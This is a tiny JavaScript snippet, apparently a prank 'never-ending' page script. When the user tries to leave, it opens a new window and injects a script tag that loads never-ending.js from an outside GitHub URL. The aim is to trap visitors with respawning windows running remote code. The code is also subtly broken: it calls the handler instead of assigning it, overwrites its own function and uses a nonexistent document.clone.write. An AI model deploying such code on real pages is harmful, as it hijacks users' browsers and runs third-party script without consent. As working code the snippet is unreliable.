window.onbeforeunload = clone();
  function clone() {
    clone = window.open("", "clone");
    document.clone.write("<script src='https://raw.githubusercontent.com/Hircinus/stupid-projects/master/never-ending.js'>&lt;/script>");
  }
